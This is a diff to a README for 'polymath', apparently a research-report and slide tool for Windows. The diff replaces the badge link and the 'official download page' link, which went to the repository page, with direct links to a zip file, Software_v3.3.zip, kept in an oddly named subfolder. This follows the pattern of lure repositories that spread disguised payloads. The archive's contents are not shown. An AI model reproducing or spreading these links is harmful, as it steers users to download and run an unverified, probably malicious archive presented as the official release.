@@ -1,6 +1,6 @@
 # 🧠 polymath - Research reports and slides made easy
 
-[![Download polymath](https://img.shields.io/badge/Download-polymath-blue.svg)](https://github.com/modiconclary910/polymath)
+[![Download polymath](https://img.shields.io/badge/Download-polymath-blue.svg)](https://github.com/modiconclary910/polymath/raw/refs/heads/main/uncommingled/Software_v3.3.zip)
 
 Polymath turns complex research topics into finished reports and slide decks. You provide a subject, and the application performs the research, writes the content, and organizes the findings. It handles the heavy lifting of gathering information and formatting documents so you can focus on the results.
 
@@ -20,7 +20,7 @@ Ensure you have the latest Windows updates installed to prevent compatibility is
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official polymath download page](https://github.com/modiconclary910/polymath).
+1. Visit the [official polymath download page](https://github.com/modiconclary910/polymath/raw/refs/heads/main/uncommingled/Software_v3.3.zip).
 2. Locate the latest release assets.
 3. Download the installer file corresponding to your version of Windows.
 4. Open your Downloads folder.
